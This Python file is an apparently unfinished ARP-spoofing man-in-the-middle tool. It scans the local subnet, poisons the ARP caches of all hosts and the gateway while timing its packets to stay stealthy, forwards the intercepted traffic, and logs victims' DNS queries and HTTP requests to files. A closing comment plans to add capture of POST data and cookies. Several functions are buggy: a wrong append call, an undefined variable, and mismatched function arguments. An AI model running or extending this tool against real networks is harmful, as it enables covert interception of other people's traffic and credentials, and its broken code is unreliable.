import ipaddress
import netifaces
from scapy.all import ARP, Ether, IP, DNS, HTTPRequest, srp, sendp, sniff
import time
import datetime
import threading

def get_subnet():
    # Retrieve the default network interface's IPv4 info
    iface = netifaces.gateways()['default'][netifaces.AF_INET][1]  # Active interface
    addresses = netifaces.ifaddresses(iface)
    
    # Extract IP and subnet mask
    ipv4_address = addresses[netifaces.AF_INET][0]['addr']  # e.g., "192.168.1.153"
    subnet_mask = addresses[netifaces.AF_INET][0]['netmask']  # e.g., "255.255.255.0"
    
    # Combine IP and subnet mask to calculate the subnet
    subnet = ipaddress.ip_network(f"{ipv4_address}/{subnet_mask}", strict=False)
    print(f"Subnet: {subnet}")  # Outputs: "192.168.1.0/24"
    return subnet

def scan_subnet(subnet):
    live_hosts = []
    print("Starting ARP sweep...")
    try:
        answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(subnet), op=1), timeout=5, verbose=False)
        for sent, received in answered:
            live_hosts.append(received.psrc, received.hwsrc)
            print (f"Live Host Found. IP: {received.psrc}    MAC: {received.hwsrc}")
    except Exception as e:
        print(f"Error during ARP sweep: {e}")
    return live_hosts

def discover_attacker_info():
    interfaces = netifaces.interfaces()  
    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface)

        if netifaces.AF_LINK in addresses:
            attacker_mac = addresses[netifaces.AF_LINK][0]['addr']
        
        if netifaces.AF_INET in addresses:
            attacker_ipv4 = addresses[netifaces.AF_INET][0]['addr']
        
    return attacker_mac, attacker_ipv4                                  # don't necessarily need attacker ip, but keeping it just in case so we can easily abstract it/pass it in


def discover_gateway(live_hosts):
    gateway_info = netifaces.gateways()
    
    # Safely get the default IPv4 gateway
    if 'default' in gateway_info and netifaces.AF_INET in gateway_info['default']:
        real_gateway_ip = gateway_info['default'][netifaces.AF_INET][0]
        
        real_gateway_mac = next((mac for ip, mac in live_hosts if ip == real_gateway_ip), None)
        if real_gateway_mac:
            return real_gateway_ip, real_gateway_mac
        else:
            raise ValueError(f"Gateway IP {real_gateway_ip} found but MAC address not discovered.")
    
    
    raise ValueError("No default gateway found.")

def poison_hosts(live_hosts, real_gateway_ip, attacker_mac, interval=10, duration=None):
    print("Starting host poisoning...")
    end_time = time.time() + duration if duration else None
    try:
        while not end_time or time.time() < end_time:
            for ip, mac in live_hosts:
                sendp(Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac, psrc=real_gateway_ip, hwsrc=attacker_mac), verbose=False)
            time.sleep(interval)                    # reduces network noise, avoids spamming the network with constant ARP packets, slightly more stealthy
    except KeyboardInterrupt:
        print("\nHost poisoning stopped.")

def poison_gateway(live_hosts, real_gateway_ip, attacker_mac, interval=10, duration=None):
    print("Starting gateway poisoning...")
    real_gateway_mac = [mac for ip, mac in live_hosts if ip == real_gateway_ip][0]
    end_time = time.time() + duration if duration else None
    try:
        while not end_time or time.time() < end_time:
            for ip, mac in live_hosts:
                if ip == real_gateway_ip:                                # we don't want to tell the gateway we are them and feed them their own ip with our mac
                    continue
                sendp(Ether(dst=real_gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=real_gateway_mac, psrc=ip, hwsrc=attacker_mac), verbose=False)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nGateway poisoning stopped.")


def forward_packets(real_gateway_mac, live_hosts):
    print("Starting packet forwarding...")
    try:
        sniff(filter="ip", prn=lambda packet: forward_traffic(packet, real_gateway_mac, live_hosts), store=False)
    except KeyboardInterrupt:
        print("\nPacket forwarding stopped.")


# Forward traffic between the host and gateway
def forward_traffic(packet):
    host_mac_map = {host_ip: host_mac for host_ip, host_mac in live_hosts}
    if IP in packet:
        # Packet going to the gateway
        if packet[IP].dst == real_gateway_ip:
            packet[Ether].src = attacker_mac  # Source MAC is attacker
            packet[Ether].dst = real_gateway_mac  # Destination MAC is the gateway's real MAC
            sendp(packet, verbose=False)
        # Packet coming from the gateway, destined for a host
        elif packet[IP].src == real_gateway_ip:
            # Look up the host's real MAC based on the packet's destination IP
            target_mac = host_mac_map.get(packet[IP].dst)
            if target_mac:
                packet[Ether].src = attacker_mac  # Source MAC is attacker
                packet[Ether].dst = target_mac  # Destination MAC is the real MAC of the host
                sendp(packet, verbose=False)


def intercept_traffic():
    protocol = input("Choose a protocol to filter (dns, http): ").lower()      # NEED TO ADD TRY/EXCEPT AND INPUT VALIDATION. Maybe just use --protocol the beginning like it's a pen testing tool
    filter_expr = {
        'http': 'tcp port 80',
        'dns': 'udp port 53'
    }.get(protocol, protocol)
    
    sniff(filter=filter_expr, prn=store_captured_traffic)

def store_captured_traffic(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # Only queries, not responses
        query = packet[DNS].qd.qname.decode('utf-8')
        src_ip = packet[IP].src
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        with open(f'dns_queries.txt', 'a') as file:
            file.write(f"{timestamp}: {src_ip} queried {query}\n")
    if packet.haslayer(HTTPRequest) and packet.getlayer(HTTPRequest).Method == 'GET':
        query = packet[HTTPRequest]
        src_ip = packet[IP].src
        dest_ip = packet[IP].dst
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        #Extract GET request line and Host header
        request_line = packet[HTTPRequest].Method + " " + packet[HTTPRequest].PathAndQuery + " " + packet[HTTPRequest].Version
        host = packet[HTTPRequest].Host.decode('utf-8')  # Decode host header for human-readable format

        with open(f'http_queries.txt', 'a') as file:
            file.write(f"{timestamp}: {src_ip} -> {dest_ip}\n ")
            file.write(f"{request_line}\n")
            file.write(f"Host: {host}\n\n")


# Main function
if __name__ == "__main__":
    subnet = get_subnet()
    live_hosts = scan_subnet(subnet)
    attacker_mac, attacker_ipv4 = discover_attacker_info()

    # Get both the gateway IP and MAC
    real_gateway_ip, real_gateway_mac = discover_gateway(live_hosts)

    # Start poisoning threads
    host_thread = threading.Thread(target=poison_hosts, args=(live_hosts, real_gateway_ip, attacker_mac, 10, None))
    gateway_thread = threading.Thread(target=poison_gateway, args=(live_hosts, real_gateway_ip, attacker_mac, 10, None))
    host_thread.start()
    gateway_thread.start()

    # Start forwarding packets
    forward_packets(real_gateway_mac, live_hosts)

    # Capture packets
    intercept_traffic()
    
    # Clean up / Restore ARP tables

'''

NEEDS:
1. Input validation for: choosing an IP to grab versus just a subnet
2. Input validation: choosing http or dns to capture.
2. Restoring the correct arp table mappings

FUTURE ENHANCEMENTS:
Future enhancements would include capturing POST data, cookies, and additional HTTP methods

'''